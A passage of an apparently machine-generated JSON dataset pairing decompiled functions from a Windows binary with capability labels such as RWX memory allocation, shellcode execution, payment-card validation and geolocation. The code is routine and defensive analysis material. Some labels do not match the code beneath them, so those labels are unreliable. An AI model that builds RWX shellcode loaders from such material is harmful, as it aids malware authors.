        "decompiled_code": "\nint32_t __cdecl fcn.0040a120(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x0040a171;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x0040a171:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 364
    },
    "0040a273": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040a273(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x45d378;\n    piVar3 = *0x45d378;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.0040162a(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.00401512(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.0040a757(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.00401512(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 357
    },
    "00401120": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401120(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, arg_8h, 0x1000, 0x40);\n    return;\n}\n",
        "token_count": 52
    },
    "00408272": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408272(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (((cVar1 < 'A') || ('Z' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) break;\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 130
    },
    "004011f0": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004011f0(void)\n\n{\n    fcn.00401210();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    return;\n}\n",
        "token_count": 39
    },
    "0040163c": {
        "rules": [
            "terminate process",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0040163c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 153
    },
    "00408a90": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a90(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.00409627(&lpLCData);\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 143
    }
}